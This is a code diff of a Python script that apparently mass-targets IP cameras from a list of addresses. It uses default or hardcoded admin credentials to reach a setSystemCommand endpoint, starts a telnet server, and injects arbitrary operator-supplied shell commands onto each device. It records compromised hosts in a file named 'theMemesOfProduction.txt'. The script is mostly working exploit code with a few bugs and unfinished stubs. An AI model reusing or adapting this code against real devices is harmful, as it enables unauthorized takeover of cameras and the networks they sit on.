@@ -3,25 +3,49 @@ import ipaddress
 import shlex
 import subprocess
 import telnetlib
+import sys
 
 
 # TODO: change this to include IP + correct creds
 def curlInjection(ip):
-    cmd = "curl 'http://" + ip + "/setSystemCommand' " \
-                                 "--user admin:admin " \
-                                 "- H 'Authorization: Basic $BASICAUTH_CREDS' " \
-                                 "- H 'Content-Type: application/x-www-form-urlencoded' - " \
-                                 "-data 'ReplySuccessPage=docmd.htm&ReplyErrorPage=docmd.htm" \
-                                 "&SystemCommand=telnetd&ConfigSystemCommand=Save'"
-    os.system(cmd)
+    # Fire up telnet server for use
+    telenetCommand = "curl --user admin:DoNotErase 'http://192.168.1.33/setSystemCommand' " \
+              "-H 'Content-Type: application/x-www-form-urlencoded' " \
+              "--data 'ReplySuccessPage=docmd.htm&ReplyErrorPage=docmdhtm&SystemCommand=telnetd&ConfigSystemCommand=Save'"
+    os.system(telenetCommand)
+
+
+# inputs a list of commands
+def commandInjectionList(cmdList):
+    if len(cmdList) == 0:
+        print("You didn't input any commands silly")
+    else:
+        for x in cmdList:
+            inputCmd = "curl --user admin:DoNotErase 'http://192.168.1.33/setSystemCommand' " \
+                             "-H 'Content-Type: application/x-www-form-urlencoded' " \
+                             "--data 'ReplySuccessPage=docmd.htm&ReplyErrorPage=docmdhtm&SystemCommand=" + x + "&ConfigSystemCommand=Save'"
+            os.system(inputCmd)
+
+
+# inputs only one single command
+def commandInjection(cmd):
+    inputCmd = "curl --user admin:DoNotErase 'http://192.168.1.33/setSystemCommand' " \
+               "-H 'Content-Type: application/x-www-form-urlencoded' " \
+               "--data 'ReplySuccessPage=docmd.htm&ReplyErrorPage=docmdhtm&SystemCommand=" + cmd + "&ConfigSystemCommand=Save'"
+    os.system(inputCmd)
+
+
+def takePicGetPic(emailAddr):
+    commandInjection('mail')
+    commandInjection('')
 
 
 if __name__ == '__main__':
     ipLog = open('ipList.txt')
     ownedDevice = open('theMemesOfProduction.txt')
     for x in ipLog:
-        currIP = ipaddress.ip_address(x)
-        cmd = shlex.split("ping " + x)
+        currIP = ipaddress.ip_address(x.strip())
+        cmd = shlex.split("ping " + str(currIP))
         # ping the IP address
         try:
             output = subprocess.check_output(cmd)
@@ -44,14 +68,15 @@ if __name__ == '__main__':
                 user = 'admin'
                 password = 'admin'
 
-                PORT = 23
-                # Connect to Camera's IP through telnet server using username and password
-                tn = telnetlib.Telnet(HOST, PORT)
-                tn.read_until("login: ")
-                tn.write(user + "\r\n")
-                tn.read_until("password: ")
-                tn.write(password + "\r\n")
-                # TODO: need to do stuff based on if we have the right one
-                # run uname to determine if we have the right camera
-                tn.write("uname -a \r\n")
-                ret1 = tn.read_eager()
+                commandList = []
+                isNotDone = True
+                while(isNotDone):
+                    print("please enter the commands you want to inject. Type 'esc' to escape")
+                    text = input("what commands do you want to enter?")
+                    if text.lower() == 'esc':
+                        isNotDone = False
+                    else:
+                        commandList.append(text)
+                print('running commands now, please be patient')
+                commandInjection(commandList)
+                print('your commands have been run on device ip:' + HOST)
